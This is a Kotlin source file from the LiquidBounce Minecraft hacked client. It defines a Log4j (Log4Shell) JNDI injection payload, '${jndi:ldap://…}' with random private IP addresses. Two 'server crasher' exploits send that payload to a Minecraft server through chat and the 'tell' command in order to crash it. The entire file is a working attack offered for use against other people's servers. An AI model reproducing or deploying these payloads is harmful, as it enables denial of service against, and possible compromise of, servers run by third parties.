/*
 * This file is part of LiquidBounce (https://github.com/CCBlueX/LiquidBounce)
 *
 * Copyright (c) 2015 - 2024 CCBlueX
 *
 * LiquidBounce is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * LiquidBounce is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with LiquidBounce. If not, see <https://www.gnu.org/licenses/>.
 */
package net.ccbluex.liquidbounce.features.module.modules.exploit.servercrasher.exploits

import net.ccbluex.liquidbounce.features.module.modules.exploit.servercrasher.exploits.types.ChatExploit
import net.ccbluex.liquidbounce.features.module.modules.exploit.servercrasher.exploits.types.CommandExploit
import org.apache.commons.lang3.RandomStringUtils

/**
 * Log4j exploit taken from FDP Client
 *
 * https://github.com/SkidderMC/FDPClient/blob/9e43a99a4c7614bccf5192bf7e26e6a320a3e0f5/src/main/java/net/ccbluex/liquidbounce/features/module/modules/exploit/ServerCrasher.kt#L565-L572
 */
private val exploitLog4j = {
    "\${jndi:ldap://192.168.${(1..253).random()}.${(1..253).random()}}"
}

/**
 * Log4j exploit
 *
 * Uses Log4j to crash the server.
 */
object Log4jChatExploit : ChatExploit("Log4jChat", {
    "${RandomStringUtils.randomAlphabetic(4)}${exploitLog4j()}${RandomStringUtils.randomAlphabetic(4)}"
})

object Log4jTellExploit : CommandExploit("Log4jTell", {
    "tell ${RandomStringUtils.randomAlphabetic(4)} ${exploitLog4j()}"
})
